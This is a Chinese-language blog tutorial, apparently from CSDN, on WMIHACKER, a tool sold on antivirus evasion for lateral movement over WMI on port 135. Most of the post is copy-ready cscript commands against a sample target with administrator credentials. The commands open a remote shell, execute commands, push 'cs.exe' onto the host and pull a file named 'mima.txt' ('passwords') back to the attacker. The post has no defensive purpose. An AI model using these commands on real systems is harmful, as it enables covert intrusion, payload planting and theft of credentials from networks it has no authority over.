**目录**

[交互式shell](#t0 "交互式shell")

[执行命令](#t1 "执行命令")

[执行无回显命令](#t2 "执行无回显命令")

[上传文件](#t3 "上传文件")

[下载文件](#t4 "下载文件")

* * *

参考文章：[WMIHACKER（仅135端口免杀横向移动） - 安全客，安全资讯平台](https://www.anquanke.com/post/id/209665?from=timeline "WMIHACKER（仅135端口免杀横向移动） - 安全客，安全资讯平台")

项目地址：[GitHub - rootclay/WMIHACKER: A Bypass Anti-virus Software Lateral Movement Command Execution Tool](https://github.com/360-Linton-Lab/WMIHACKER "GitHub - rootclay/WMIHACKER: A Bypass Anti-virus Software Lateral Movement Command Execution Tool")

主要功能：

*   命令执行与结果读取
*   文件上传
*   文件下载
*   支持win2003机器以后所有版本

**使用：**

执行模式包括**/cmd、/shell、/upload、/download**分别指执行命令、模拟shell、上传文件、下载文件

/cmd 模式中1代表获取命令执行结果，0代表不获取结果，比如执行命令为”echo 1 > test”这类需要重定向或其他不需要输出的命令选择值应该为0.

![](https://img-blog.csdnimg.cn/20200702215922871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 交互式shell

```
cscript //nologo WMIHACKER_0.6.vbs /shell 192.168.10.20 administrator "root"
```


### 执行命令

```
cscript //nologo WMIHACKER_0.6.vbs /cmd 192.168.10.20 administrator "root" "ipconfig" 1
```


![](https://img-blog.csdnimg.cn/20200702220335836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 执行无回显命令

```
cscript //nologo WMIHACKER_0.6.vbs /cmd 192.168.10.20 administrator "root" "echo whoami > c:\1.txt" 0      
cscript //nologo WMIHACKER_0.6.vbs /cmd 192.168.10.20 administrator "root" "type c:\1.txt" 1
```


![](https://img-blog.csdnimg.cn/2020070222053276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200702220550364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200702220631516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 上传文件

上传e盘下的cs.exe到目标主机的C盘下

```
cscript //nologo WMIHACKER_0.6.vbs /upload 192.168.10.20 administrator "root" "e:\cs.exe" "c:\cs.exe"
```


![](https://img-blog.csdnimg.cn/20200702220936580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200702221058195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 下载文件

下载目标c盘下的mima.txt到本地的E盘下

```
cscript //nologo WMIHACKER_0.6.vbs /download 192.168.10.20 administrator "root" "c:\mima.txt" "e:\mima.txt"
```


![](https://img-blog.csdnimg.cn/20200702221601363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)